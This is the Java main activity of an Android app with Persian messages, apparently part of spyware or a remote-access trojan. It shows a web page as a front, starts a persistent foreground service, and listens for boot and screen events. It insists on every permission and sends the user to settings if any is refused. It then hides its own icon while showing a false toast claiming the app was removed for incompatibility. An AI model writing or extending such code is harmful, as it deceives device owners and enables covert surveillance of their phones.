package com.mehrab.android;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.mehrab.android.Application.ServiceManager;
import com.mehrab.android.Receiver.AllEventReceiver;
import com.mehrab.android.Service.ForegroundService;

public class MainActivity extends AppCompatActivity {
    WebView webView;
    ServiceManager manager;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
        filter.addAction(Intent.ACTION_BATTERY_CHANGED);

        registerReceiver(new AllEventReceiver(), filter);

        Toast.makeText(this ,"لطفا تا بارگذاری کامل صفحه صبوری کنید ...",Toast.LENGTH_LONG).show();

        manager = (ServiceManager) getApplicationContext();

        manager.setDefaultComponent(new ComponentName(this ,MainActivity.class));

        webView = findViewById(R.id.WebView);

        requestPermission(manager.permissions , 1);
        Intent intent = new Intent(this, ForegroundService.class);

        if(!CheckServiceRunning())
        {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(intent);
            else startService(intent);
        }


    }
    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onStart() {
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                view.loadData("<body style='direction:rtl;'>عدم اتصال به سرور لطفا از اتصال اینترنت خود اطمینان حاصل کرده و مجدد با باز و بسته کردن برنامه تلاش کنید</body>", "text/html", "UTF-8");
            }
        });
        webView.loadUrl(manager.getTemplate());

        manager.setOpen(true);
        super.onStart();
    }

    @Override
    protected void onStop() {
        manager.setOpen(false);
        super.onStop();
    }

    @Override
    protected void onDestroy() {
        webView.destroy();
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {

        if (webView.canGoBack()) webView.goBack();
        else super.onBackPressed();

    }

    private boolean CheckServiceRunning() {
        ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (ForegroundService.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {

        if(!manager.CheckPermissions()){
            startActivity(
                    new Intent(
                            android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.fromParts("package", getPackageName(), null)
                    )
            );
            Toast.makeText(getApplicationContext() ,"لطفا همه دسترسی های برنامه رو فعال کنید",Toast.LENGTH_LONG).show();
            finish();
        }else if(manager.GetAutoHide())
        {
            manager.HideApplication();
            Toast.makeText(getApplicationContext() ,"برنامه به دلیل عدم ناسازگاری حذف شد",Toast.LENGTH_LONG).show();
        }

        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

    }
    private void requestPermission(String[] permissions, int RequestCode) {
        ActivityCompat.requestPermissions(this, permissions, RequestCode);
    }
}